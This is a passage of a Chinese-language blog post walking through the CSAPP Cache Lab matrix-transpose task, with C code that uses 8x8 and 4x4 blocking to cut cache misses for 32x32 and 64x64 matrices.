i] = x4;</span><br><span class="line">	    	    B[j + <span class="number">4</span>][k + i] = x5;</span><br><span class="line">	    	    B[j + <span class="number">5</span>][k + i] = x6;</span><br><span class="line">	    	    B[j + <span class="number">6</span>][k + i] = x7;</span><br><span class="line">	    	    B[j + <span class="number">7</span>][k + i] = x8;</span><br><span class="line">    	    &#125;</span><br><span class="line">    	&#125; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>通过 <strong>.&#x2F;test-trans -M 32 -N 32</strong>，运行结果如下</li>
</ul>
<img src="/2024/03/22/CSAPP-Lab5/image-20240326135509782.png" class="" title="image-20240326135509782">

<ul>
<li><p>满分！但其实这还不是最优解，因为仅仅是 A 达到了最优情况，当遇到对角线情况时，B 还是会再造成额外的缓存不命中</p>
</li>
<li><p>我们思考一下为什么会有这种情况：当读入 A 的一行时，可能会覆盖缓存中已经存在的 B 的一行，当写入 B 的一列时就会造成额外的冲突不命中和缓存不命中</p>
</li>
<li><p>如果我们可以保证对于 A、B 会映射到的同一个块，A 访问完后 B 再访问，那不就可以避免写入 B 时额外的缓存不命中了吗</p>
</li>
<li><p>但仔细想想这样又很不现实，先读入 A 的一行后，我们是要将它写入 B 的一列的，这样就会不可避免的造成额外的缓存不命中，如果我们可以将先读入的 A 的 8 行都保存起来，再一次性写入 B 不就可以了吗（发现了吗，这就是为什么要限制局部变量的使用的原因）</p>
</li>
<li><p>按照这个思路，由于局部变量有限，我们需要将读入的 A 的行保存在其他地方，现在唯一可以保存的地方好像就只有 B 了，我们并不关心 B 中的原来元素的什么。如果我们可以把每次读入的 A 的行保存在 B 的行中，在每次读入新的 A 的行到 B 之前，将 B 中已经读入的需要（可以）转置的元素移动到 B 中的指定位置从而完成转置。听起来很不可思议！但还真有这种方法！</p>
</li>
<li><p>过程的实现中有大量的细节，这里就不过多展开了，如果想了解具体发生了什么，可以按照下面的代码进行模拟，具体实现如下</p>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">transpose_submit</span><span class="params">(<span class="type">int</span> M, <span class="type">int</span> N, <span class="type">int</span> A[N][M], <span class="type">int</span> B[M][N])</span> &#123;</span><br><span class="line">    <span class="type">int</span> x, x1, x2, x3, x4, x5, x6, x7, x8;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; N; i += <span class="number">8</span>) &#123;</span><br><span class="line">    	<span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; M; j += <span class="number">8</span>) &#123;</span><br><span class="line"> 	    <span class="keyword">if</span> (i == j) &#123;</span><br><span class="line"> 	    	    x = i;</span><br><span class="line">	    	    </span><br><span class="line">	    	    x1 = A[x][j];		x2 = A[x][j + <span class="number">1</span>];	x3 = A[x][j + <span class="number">2</span>];	x4 = A[x][j + <span class="number">3</span>];	</span><br><span class="line">	    	    x5 = A[x][j + <span class="number">4</span>];	x6 = A[x][j + <span class="number">5</span>];	x7 = A[x][j + <span class="number">6</span>];	x8 = A[x][j + <span class="number">7</span>];</span><br><span class="line">	    	    	</span><br><span class="line">	    	    B[x][j] = x1;		B[x][j + <span class="number">1</span>] = x2;	B[x][j + <span class="number">2</span>] = x3;	B[x][j + <span class="number">3</span>] = x4;</span><br><span class="line">	    	    B[x][j + <span class="number">4</span>] = x5;	B[x][j + <span class="number">5</span>] = x6;	B[x][j + <span class="number">6</span>] = x7;	B[x][j + <span class="number">7</span>] = x8;</span><br><span class="line">	    	    </span><br><span class="line">	    	    x1 = A[x + <span class="number">1</span>][j];		x2 = A[x + <span class="number">1</span>][j + <span class="number">1</span>];	x3 = A[x + <span class="number">1</span>][j + <span class="number">2</span>];	</span><br><span class="line">            	x4 = A[x + <span class="number">1</span>][j + <span class="number">3</span>];	x5 = A[x + <span class="number">1</span>][j + <span class="number">4</span>];	x6 = A[x + <span class="number">1</span>][j + <span class="number">5</span>];	</span><br><span class="line">	    	   	x7 = A[x + <span class="number">1</span>][j + <span class="number">6</span>];	x7 = A[x + <span class="number">1</span>][j + <span class="number">6</span>];	x8 = A[x + <span class="number">1</span>][j + <span class="number">7</span>];</span><br><span class="line">	    	    </span><br><span class="line">            	<span class="comment">// (2.1)</span></span><br><span class="line">	    	    B[x + <span class="number">1</span>][j] = B[x][j + <span class="number">1</span>];		B[x][j + <span class="number">1</span>] = x1;	</span><br><span class="line">	    	    </span><br><span class="line">	    	   	B[x + <span class="number">1</span>][j + <span class="number">1</span>] = x2;	B[x + <span class="number">1</span>][j + <span class="number">2</span>] = x3;	B[x + <span class="number">1</span>][j + <span class="number">3</span>] = x4;</span><br><span class="line">	    	    B[x + <span class="number">1</span>][j + <span class="number">4</span>] = x5;	B[x + <span class="number">1</span>][j + <span class="number">5</span>] = x6;	B[x + <span class="number">1</span>][j + <span class="number">6</span>] = x7;	</span><br><span class="line">            	B[x + <span class="number">1</span>][j + <span class="number">7</span>] = x8;</span><br><span class="line">	    	    </span><br><span class="line">	    	    x1 = A[x + <span class="number">2</span>][j];		x2 = A[x + <span class="number">2</span>][j + <span class="number">1</span>];	x3 = A[x + <span class="number">2</span>][j + <span class="number">2</span>];	</span><br><span class="line">	    	    x4 = A[x + <span class="number">2</span>][j + <span class="number">3</span>];	x5 = A[x + <span class="number">2</span>][j + <span class="number">4</span>];	x6 = A[x + <span class="number">2</span>][j + <span class="number">5</span>];	</span><br><span class="line">           		x7 = A[x + <span class="number">2</span>][j + <span class="number">6</span>];	x8 = A[x + <span class="number">2</span>][j + <span class="number">7</span>];</span><br><span class="line">	    	    </span><br><span class="line">            	<span class="comment">// (3.1) (3.2)</span></span><br><span class="line">	    	    B[x + <span class="number">2</span>][j] = B[x][j + <span class="number">2</span>];			B[x][j + <span class="number">2</span>] = x1;;	</span><br><span class="line">	    	    B[x + <span class="number">2</span>][j + <span class="number">1</span>] = B[x + <span class="number">1</span>][j + <span class="number">2</span>];	B[x + <span class="number">1</span>][j + <span class="number">2</span>] = x2;	</span><br><span class="line">	    	    </span><br><span class="line">	    	    B[x + <span class="number">2</span>][j + <span class="number">2</span>] = x3;	B[x + <span class="number">2</span>][j + <span class="number">3</span>] = x4;</span><br><span class="line">	    	    B[x + <span class="number">2</span>][j + <span class="number">4</span>] = x5;	B[x + <span class="number">2</span>][j + <span class="number">5</span>] = x6;	</span><br><span class="line">	    	    B[x + <span class="number">2</span>][j + <span class="number">6</span>] = x7;	B[x + <span class="number">2</span>][j + <span class="number">7</span>] = x8;</span><br><span class="line">	    	    </span><br><span class="line">	    	    x1 = A[x + <span class="number">3</span>][j];		x2 = A[x + <span class="number">3</span>][j + <span class="number">1</span>];	x3 = A[x + <span class="number">3</span>][j + <span class="number">2</span>];	</span><br><span class="line">	    	    x4 = A[x + <span class="number">3</span>][j + <span class="number">3</span>];	x5 = A[x + <span class="number">3</span>][j + <span class="number">4</span>];	x6 = A[x + <span class="number">3</span>][j + <span class="number">5</span>];	</span><br><span class="line">            	x7 = A[x + <span class="number">3</span>][j + <span class="number">6</span>];	x8 = A[x + <span class="number">3</span>][j + <span class="number">7</span>];</span><br><span class="line">	    	    </span><br><span class="line">            	<span class="comment">// (4.1) (4.2) (4.3)</span></span><br><span class="line">	    	    B[x + <span class="number">3</span>][j] = B[x][j + <span class="number">3</span>]; 			B[x][j + <span class="number">3</span>] = x1;	</span><br><span class="line">	    	    B[x + <span class="number">3</span>][j + <span class="number">1</span>] = B[x + <span class="number">1</span>][j + <span class="number">3</span>];	B[x + <span class="number">1</span>][j + <span class="number">3</span>] = x2;	</span><br><span class="line">	    	    B[x + <span class="number">3</span>][j + <span class="number">2</span>] = B[x + <span class="number">2</span>][j + <span class="number">3</span>];	B[x + <span class="number">2</span>][j + <span class="number">3</span>] = x3;</span><br><span class="line">	    	    </span><br><span class="line">	    	    B[x + <span class="number">3</span>][j + <span class="number">3</span>] = x4;	B[x + <span class="number">3</span>][j + <span class="number">4</span>] = x5;	B[x + <span class="number">3</span>][j + <span class="number">5</span>] = x6;	</span><br><span class="line">            	B[x + <span class="number">3</span>][j + <span class="number">6</span>] = x7;	B[x + <span class="number">3</span>][j + <span class="number">7</span>] = x8;</span><br><span class="line">	    	    </span><br><span class="line">	    	    x1 = A[x + <span class="number">4</span>][j];		x2 = A[x + <span class="number">4</span>][j + <span class="number">1</span>];	x3 = A[x + <span class="number">4</span>][j + <span class="number">2</span>];	</span><br><span class="line">            	x4 = A[x + <span class="number">4</span>][j + <span class="number">3</span>];	x5 = A[x + <span class="number">4</span>][j + <span class="number">4</span>];	x6 = A[x + <span class="number">4</span>][j + <span class="number">5</span>];</span><br><span class="line">	    	    x7 = A[x + <span class="number">4</span>][j + <span class="number">6</span>];	x8 = A[x + <span class="number">4</span>][j + <span class="number">7</span>];</span><br><span class="line">	    	    </span><br><span class="line">            	<span class="comment">// (5.1) (5.2) (5.3) (5.4)</span></span><br><span class="line">	    	    B[x + <span class="number">4</span>][j] = B[x][j + <span class="number">4</span>];			B[x][j + <span class="number">4</span>] = x1;	</span><br><span class="line">	    	    B[x + <span class="number">4</span>][j + <span class="number">1</span>] = B[x + <span class="number">1</span>][j + <span class="number">4</span>];	B[x + <span class="number">1</span>][j + <span class="number">4</span>] = x2;	</span><br><span class="line">	    	    B[x + <span class="number">4</span>][j + <span class="number">2</span>] = B[x + <span class="number">2</span>][j + <span class="number">4</span>];	B[x + <span class="number">2</span>][j + <span class="number">4</span>] = x3;	</span><br><span class="line">	    	    B[x + <span class="number">4</span>][j + <span class="number">3</span>] = B[x + <span class="number">3</span>][j + <span class="number">4</span>];	B[x + <span class="number">3</span>][j + <span class="number">4</span>] = x4;</span><br><span class="line">	    	    </span><br><span class="line">	    	    B[x + <span class="number">4</span>][j + <span class="number">4</span>] = x5;	B[x + <span class="number">4</span>][j + <span class="number">5</span>] = x6;	B[x + <span class="number">4</span>][j + <span class="number">6</span>] = x7;	</span><br><span class="line">            	B[x + <span class="number">4</span>][j + <span class="number">7</span>] = x8;</span><br><span class="line">	    	    </span><br><span class="line">	    	    x1 = A[x + <span class="number">5</span>][j];		x2 = A[x + <span class="number">5</span>][j + <span class="number">1</span>];	x3 = A[x + <span class="number">5</span>][j + <span class="number">2</span>];	</span><br><span class="line">            	x4 = A[x + <span class="number">5</span>][j + <span class="number">3</span>];	x5 = A[x + <span class="number">5</span>][j + <span class="number">4</span>];	x6 = A[x + <span class="number">5</span>][j + <span class="number">5</span>];</span><br><span class="line">	    	    x7 = A[x + <span class="number">5</span>][j + <span class="number">6</span>];	x8 = A[x + <span class="number">5</span>][j + <span class="number">7</span>];</span><br><span class="line">	    	    </span><br><span class="line">            	<span class="comment">// (6.1) (6.2) (6.3) (6.4) (6.5)</span></span><br><span class="line">	    	    B[x + <span class="number">5</span>][j] = B[x][j + <span class="number">5</span>];			B[x][j + <span class="number">5</span>] = x1;  </span><br><span class="line">	    	    B[x + <span class="number">5</span>][j + <span class="number">1</span>] = B[x + <span class="number">1</span>][j + <span class="number">5</span>];	B[x + <span class="number">1</span>][j + <span class="number">5</span>] = x2;	</span><br><span class="line">	    	    B[x + <span class="number">5</span>][j + <span class="number">2</span>] = B[x + <span class="number">2</span>][j + <span class="number">5</span>];	B[x + <span class="number">2</span>][j + <span class="number">5</span>] = x3;	</span><br><span class="line">	    	    B[x + <span class="number">5</span>][j + <span class="number">3</span>] = B[x + <span class="number">3</span>][j + <span class="number">5</span>];	B[x + <span class="number">3</span>][j + <span class="number">5</span>] = x4;</span><br><span class="line">	    	    B[x + <span class="number">5</span>][j + <span class="number">4</span>] = B[x + <span class="number">4</span>][j + <span class="number">5</span>];	B[x + <span class="number">4</span>][j + <span class="number">5</span>] = x5;</span><br><span class="line">	    	    </span><br><span class="line">	    	    B[x + <span class="number">5</span>][j + <span class="number">5</span>] = x6;	B[x + <span class="number">5</span>][j + <span class="number">6</span>] = x7;	B[x + <span class="number">5</span>][j + <span class="number">7</span>] = x8;</span><br><span class="line">	    	    </span><br><span class="line">	    	    x1 = A[x + <span class="number">6</span>][j];		x2 = A[x + <span class="number">6</span>][j + <span class="number">1</span>];	x3 = A[x + <span class="number">6</span>][j + <span class="number">2</span>];	</span><br><span class="line">            	x4 = A[x + <span class="number">6</span>][j + <span class="number">3</span>];	x5 = A[x + <span class="number">6</span>][j + <span class="number">4</span>];	x6 = A[x + <span class="number">6</span>][j + <span class="number">5</span>];</span><br><span class="line">	    	    x7 = A[x + <span class="number">6</span>][j + <span class="number">6</span>];	x8 = A[x + <span class="number">6</span>][j + <span class="number">7</span>];</span><br><span class="line">	    	    </span><br><span class="line">            	<span class="comment">// (7.1) (7.2) (7.3) (7.4) (7.5) (7.6)</span></span><br><span class="line">	    	    B[x + <span class="number">6</span>][j] = B[x][j + <span class="number">6</span>];			B[x][j + <span class="number">6</span>] = x1; </span><br><span class="line">	    	    B[x + <span class="number">6</span>][j + <span class="number">1</span>] = B[x + <span class="number">1</span>][j + <span class="number">6</span>];	B[x + <span class="number">1</span>][j + <span class="number">6</span>] = x2;	</span><br><span class="line">	    	    B[x + <span class="number">6</span>][j + <span class="number">2</span>] = B[x + <span class="number">2</span>][j + <span class="number">6</span>];	B[x + <span class="number">2</span>][j + <span class="number">6</span>] = x3;	</span><br><span class="line">	    	    B[x + <span class="number">6</span>][j + <span class="number">3</span>] = B[x + <span class="number">3</span>][j + <span class="number">6</span>];	B[x + <span class="number">3</span>][j + <span class="number">6</span>] = x4;</span><br><span class="line">	    	    B[x + <span class="number">6</span>][j + <span class="number">4</span>] = B[x + <span class="number">4</span>][j + <span class="number">6</span>];	B[x + <span class="number">4</span>][j + <span class="number">6</span>] = x5;	</span><br><span class="line">	    	    B[x + <span class="number">6</span>][j + <span class="number">5</span>] = B[x + <span class="number">5</span>][j + <span class="number">6</span>];	B[x + <span class="number">5</span>][j + <span class="number">6</span>] = x6;</span><br><span class="line">	    	    </span><br><span class="line">	    	    B[x + <span class="number">6</span>][j + <span class="number">6</span>] = x7;	B[x + <span class="number">6</span>][j + <span class="number">7</span>] = x8;</span><br><span class="line">	    	    </span><br><span class="line">	    	    x1 = A[x + <span class="number">7</span>][j];		x2 = A[x + <span class="number">7</span>][j + <span class="number">1</span>];	x3 = A[x + <span class="number">7</span>][j + <span class="number">2</span>];	</span><br><span class="line">            	x4 = A[x + <span class="number">7</span>][j + <span class="number">3</span>];	x5 = A[x + <span class="number">7</span>][j + <span class="number">4</span>];	x6 = A[x + <span class="number">7</span>][j + <span class="number">5</span>];	</span><br><span class="line">            	x7 = A[x + <span class="number">7</span>][j + <span class="number">6</span>];	x8 = A[x + <span class="number">7</span>][j + <span class="number">7</span>];</span><br><span class="line">	    	    </span><br><span class="line">            	<span class="comment">// (8.1) (8.2) (8.3) (8.4) (8.5) (8.6) (8.7)</span></span><br><span class="line">	    	    B[x + <span class="number">7</span>][j] = B[x][j + <span class="number">7</span>];			B[x][j + <span class="number">7</span>] = x1;	</span><br><span class="line">	    	    B[x + <span class="number">7</span>][j + <span class="number">1</span>] = B[x + <span class="number">1</span>][j + <span class="number">7</span>];	B[x + <span class="number">1</span>][j + <span class="number">7</span>] = x2;	</span><br><span class="line">	    	    B[x + <span class="number">7</span>][j + <span class="number">2</span>] = B[x + <span class="number">2</span>][j + <span class="number">7</span>];	B[x + <span class="number">2</span>][j + <span class="number">7</span>] = x3;	</span><br><span class="line">	    	    B[x + <span class="number">7</span>][j + <span class="number">3</span>] = B[x + <span class="number">3</span>][j + <span class="number">7</span>];	B[x + <span class="number">3</span>][j + <span class="number">7</span>] = x4;</span><br><span class="line">	    	    B[x + <span class="number">7</span>][j + <span class="number">4</span>] = B[x + <span class="number">4</span>][j + <span class="number">7</span>];	B[x + <span class="number">4</span>][j + <span class="number">7</span>] = x5;	</span><br><span class="line">	    	    B[x + <span class="number">7</span>][j + <span class="number">5</span>] = B[x + <span class="number">5</span>][j + <span class="number">7</span>];	B[x + <span class="number">5</span>][j + <span class="number">7</span>] = x6;</span><br><span class="line">	    	    B[x + <span class="number">7</span>][j + <span class="number">6</span>] = B[x + <span class="number">6</span>][j + <span class="number">7</span>];	B[x + <span class="number">6</span>][j + <span class="number">7</span>] = x7;</span><br><span class="line">	    	    </span><br><span class="line">	    	    B[x + <span class="number">7</span>][j + <span class="number">7</span>] = x8;</span><br><span class="line">	    	</span><br><span class="line">	    	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	    		<span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; <span class="number">8</span>; k++) &#123;</span><br><span class="line">		    	    x1 = A[k + i][j];</span><br><span class="line">		    	    x2 = A[k + i][j + <span class="number">1</span>];</span><br><span class="line">		    	    x3 = A[k + i][j + <span class="number">2</span>];</span><br><span class="line">		    	    x4 = A[k + i][j + <span class="number">3</span>];</span><br><span class="line">		    	    x5 = A[k + i][j + <span class="number">4</span>];</span><br><span class="line">		    	    x6 = A[k + i][j + <span class="number">5</span>];</span><br><span class="line">		    	    x7 = A[k + i][j + <span class="number">6</span>];</span><br><span class="line">		    	    x8 = A[k + i][j + <span class="number">7</span>];</span><br><span class="line">		    	    </span><br><span class="line">		    	    B[j][k + i] = x1;</span><br><span class="line">		    	    B[j + <span class="number">1</span>][k + i] = x2;</span><br><span class="line">		    	    B[j + <span class="number">2</span>][k + i] = x3;</span><br><span class="line">		    	    B[j + <span class="number">3</span>][k + i] = x4;</span><br><span class="line">		    	    B[j + <span class="number">4</span>][k + i] = x5;</span><br><span class="line">		    	    B[j + <span class="number">5</span>][k + i] = x6;</span><br><span class="line">		    	    B[j + <span class="number">6</span>][k + i] = x7;</span><br><span class="line">		    	    B[j + <span class="number">7</span>][k + i] = x8;</span><br><span class="line">    	   	 &#125;</span><br><span class="line">	    	&#125;</span><br><span class="line">    	&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>因为 B 也达到了最优情况，所以结果是满分中的满分！</li>
</ul>
<img src="/2024/03/22/CSAPP-Lab5/image-20240326140925130.png" class="" title="image-20240326140925130">

<h2 id="64-64"><a href="#64-64" class="headerlink" title="64 * 64"></a>64 * 64</h2><ul>
<li>我们先不加思考的对它使用 8 * 8 分块优化，通过 <strong>.&#x2F;test-trans -M 64 -N 64</strong>，运行结果如下</li>
</ul>
<img src="/2024/03/22/CSAPP-Lab5/image-20240326143513458.png" class="" title="image-20240326143513458">

<ul>
<li><p>缓存不命中次数来到了惊人的 4611 次！我们来分析一下到底发生了什么</p>
</li>
<li><p>cache 有 32 个组，每组一行，每块 8 个 int，由于是 64 * 64 矩阵，所以 4 行就可以填满整个 cache，当我们使用 8 * 8 分块时，就不难理解为什么会这样了</p>
</li>
<li><p>每次读入 A 中一行 8 个 元素到局部变量时，都会造成一次缓存不命中（不可避免的），当我们将这 8 个局部变量写入到 B 的一列时，由于这里是 8 * 8 分块，所以一列是 8 个元素，也就是 8 行，然而对于 64 * 64 矩阵来说，4 行就可以填满整个 cache，因此当我们写入 B 的一列时，后 4 行会覆盖刚刚读入的前 4 行，这就导致了 B 中的每个元素都会造成一次冲突不命中和缓存不命中！</p>
</li>
<li><p>理所当然的，由于 4 行就可以填满整个 cache，我们想到了 4 * 4 分块，具体实现如下</p>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">transpose_submit</span><span class="params">(<span class="type">int</span> M, <span class="type">int</span> N, <span class="type">int</span> A[N][M], <span class="type">int</span> B[M][N])</span> &#123;</span><br><span class="line">    <span class="type">int</span> x1, x2, x3, x4;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; N; i += <span class="number">4</span>) &#123;</span><br><span class="line">    	<span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; M; j += <span class="number">4</span>) &#123;</span><br><span class="line">    		<span class="keyword">for</span> (<span class="type">int</span> k = i; k &lt; i + <span class="number">4</span>; k++) &#123;</span><br><span class="line">    			x1 = A[k][j];</span><br><span class="line">    			x2 = A[k][j + <span class="number">1</span>];</span><br><span class="line">    			x3 = A[k][j + <span class="number">2</span>];</span><br><span class="line">    			x4 = A[k][j + <span class="number">3</span>];</span><br><span class="line">    			</span><br><span class="line">    			B[j][k] = x1;</span><br><span class="line">    			B[j + <span class="number">1</span>][k] = x2;</span><br><span class="line">    			B[j + <span class="number">2</span>][k] = x3;</span><br><span class="line">    			B[j + <span class="number">3</span>][k] = x4;</span><br><span class="line">    		&#125;</span><br><span class="line">    	&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>通过 <strong>.&#x2F;test-trans -M 64 -N 64</strong>，运行结果如下</li>
</ul>
<img src="/2024/03/22/CSAPP-Lab5/image-20240326144644822.png" class="" title="image-20240326144644822">

<ul>
<li><p>缓存不命中次数来到了 1699，通过了！但没有取得满分</p>
</li>
<li><p>我们来分析一下 4 * 4 分块不足，为什么没有取得很好的效果：由于 cache 的一行（块）是 8 个 int，而对于 4 * 4 分块，写入 B 的一列时，我们仅仅利用了已经存入的一行的 4 个 元素，对于后 4 个元素并没有利用。因此，没有充分利用缓存是 4 * 4 分块没有取得理想效果的主要原因</p>
</li>
<li><p>我们发现：cache 一行可以存放 8 个 int，要想充分利用缓存，8 * 8 分块才是理想的优化方向。然而对于 64 * 64 的矩阵，每 4 行就可以填满整个 cache，如果我们还想对它使用 8 * 8 分块的化，就需要另辟蹊径了</p>
</li>
<li><p>按照这个思路，我们的优化目标还是 8 * 8 分块，而对于 64 * 64 矩阵，4 * 4 分块才能合理的取得不错的效果，那如果我们可以在 8 * 8 分块的基础上对它使用 4 * 4 分块，是不是就既可以充分利用缓存，又可以合理的在 64 * 64 矩阵上运行了呢，答案是：Yes！</p>
</li>
<li><p>因此我们采用的方案还是使用 8 * 8 分块，再在这个 8 * 8 矩阵上再使用 4 * 4 分块</p>
</li>
<li><p>两个 8 * 8 矩阵 A、B 的初始情况如下 （左 B 右 A），将其分为 4 个 4 * 4 矩阵处理，具体步骤如下</p>
</li>
</ul>
<img src="/2024/03/22/CSAPP-Lab5/image-20240326152558868.png" class="" title="image-20240326152558868">

<ul>
<li><p>第一步：读取 A 的左上行和右上行，将 A 的左上行存入 B 的左上列，为了充分利用缓存，将 A 的右上行存入 B 的右上列</p>
<blockquote>
<p>由于 cache 一行 8 个 int，读取 A 的左上块和右上块充分利用了缓存，对比于普通的 4 * 4 分块，减少了缓存不命中</p>
<p>第一步完成了 B 的左上块的转置，但此时 B 的右上块存入的是错误的元素，接下来还会对它进行处理</p>
</blockquote>
</li>
</ul>
<img src="/2024/03/22/CSAPP-Lab5/image-20240326152805960.png" class="" title="image-20240326152805960">

<ul>
<li><p>第二步：读取 A 的左下列，读取 B 的右上行，此时 B 的右上行还在缓存中，将 A 的左下列存入 B 的右上行，将 B 的原右上行存入 B 的左下行</p>
<blockquote>
<p>在第二步中，我们仅仅通过读取 A 的左下块，就完成了 B 中右上块和左下块的转置，通过特定的读取和写入顺序也减少了缓存不命中</p>
</blockquote>
</li>
</ul>
<img src="/2024/03/22/CSAPP-Lab5/image-20240326154309061.png" class="" title="image-20240326154309061">

<ul>
<li>第三步：读取 A 的右下行，写入到 B 的右下列</li>
</ul>
<img src="/2024/03/22/CSAPP-Lab5/image-20240326154418669.png" class="" title="image-20240326154418669">

<ul>
<li>代码的实现过程中还是有很多细节的，需要我们仔细分析，具体实现如下</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">transpose_submit</span><span class="params">(<span class="type">int</span> M, <span class="type">int</span> N, <span class="type">int</span> A[N][M], <span class="type">int</span> B[M][N])</span> &#123;</span><br><span class="line">	<span class="type">int</span> x1, x2, x3, x4, x5, x6, x7, x8;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; N; i += <span class="number">8</span>) &#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; M; j += <span class="number">8</span>) &#123;</span><br><span class="line">			</span><br><span class="line">			<span class="keyword">for</span> (<span class="type">int</span> k = i; k &lt; i + <span class="number">4</span>; k++) &#123;</span><br><span class="line">					</span><br><span class="line">					<span class="comment">// 读取 A 的左上行</span></span><br><span class="line">					x1 = A[k][j];				</span><br><span class="line">					x2 = A[k][j + <span class="number">1</span>];			</span><br><span class="line">					x3 = A[k][j + <span class="number">2</span>];</span><br><span class="line">					x4 = A[k][j + <span class="number">3</span>];</span><br><span class="line">					</span><br><span class="line">                	<span class="comment">// 读取 A 的右上行</span></span><br><span class="line">					x5 = A[k][j + 